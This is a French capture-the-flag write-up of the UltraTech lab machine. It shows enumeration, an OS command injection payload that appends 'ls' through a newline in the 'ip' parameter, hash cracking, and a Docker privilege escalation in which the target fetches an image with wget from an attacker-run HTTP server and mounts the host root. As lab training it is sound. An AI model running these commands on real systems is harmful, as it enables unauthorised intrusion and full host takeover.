
- **IP**

```
10.49.148.176
```

Mr00tf357a0c52799563c7c7b76c1e7543a32

Le scan nmap revele

![[nmap0.png]]

port 31331

![[Ultratech/file/web.png]]

Nous allons énumérer les fichier et répertoire caché avec **dirb**

```
dirb http://10.49.148.176:31331/
```

![[dirb.png]]

Nous allons aller voir le contenu de **robots.txt**

![[robots_txt.png]]

/utech_sitemap.txt

![[utech_sitemap.png]]

/partners.thml

![[parteners.png]]

Quand on veut accéder à `/partners.html`, on peut voirles requêtes envoyer au serveur dans burp suite:

![[burp_ping.png]]

Ça a bien l'air d'être vuln à l' **OS command injectio**. Après quelques tentatives, j'ai pu trouvé le payloads qui marche: `ip=10.10.75.119%0Als`

![[bdd.png]]

Le contenu du fichier `.sqlite` nous intéresse :

![[cat_sqlite.png]]

On a un mdp hashé. On va donc déchifrer ça:

![[hash.png]]

On a maintenant un mdp pour l'utilisateur **r00t**

![[ssh_r00t.png]]

![[id_user.png]]

Là on voit que notre utilisateur peut exécuter des commandes docker. En faisant des recherches, j'ai trouvé coment élevé le privilège via **Docker**: https://github.com/chrisfosterelli/dockerrootplease

à exécuter sur le PC attaquant:

```
docker pull chrisfosterelli/rootplease
docker save --output rootplease.tar chrisfosterelli/rootplease
sudo chmod 755 rootplease.tar
python3 -m http.server
```

à exécuter sur la cible:

```
wget http://192.168.143.132:8000/rootplease.tar
docker load --input rootplease.tar
docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease
```

![[Ultratech/file/root.png]]

